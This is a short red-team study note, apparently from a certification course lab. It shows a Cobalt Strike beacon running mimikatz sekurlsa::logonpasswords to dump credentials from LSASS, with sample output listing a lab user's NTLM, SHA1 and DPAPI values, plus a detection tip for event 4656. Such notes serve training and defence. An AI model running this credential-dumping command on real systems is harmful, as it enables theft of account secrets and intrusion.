
1) Just like using regular [[Mimikatz]], you can use the Cobalt Strike tool to extract [[NetNTLM]] hashes:

```
beacon> mimikatz !sekurlsa::logonpasswords

Authentication Id : 0 ; 579458 (00000000:0008d782)
Session           : Batch from 0
User Name         : jking
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 8/31/2022 11:49:48 AM
SID               : S-1-5-21-569305411-121244042-2357301523-1105
	msv :
	 [00000003] Primary
	 * Username : jking
	 * Domain   : DEV
	 * NTLM     : 59fc0f884922b4ce376051134c71e22c
	 * SHA1     : 74fa9854d529092b92e0d9ebef7ce3d065027f45
	 * DPAPI    : 0837e40088a674327961e1d03946f5f2
```

### ⚠ Opsec

This module will open a read handle to LSASS which can be logged under event 4656.  Use the "Suspicious Handle to LSASS" saved search in Kibana to see them.


### Properties
---
📆 created   {{11-02-2024}} 11:50
🏷️ tags: #redteam #crto 

---

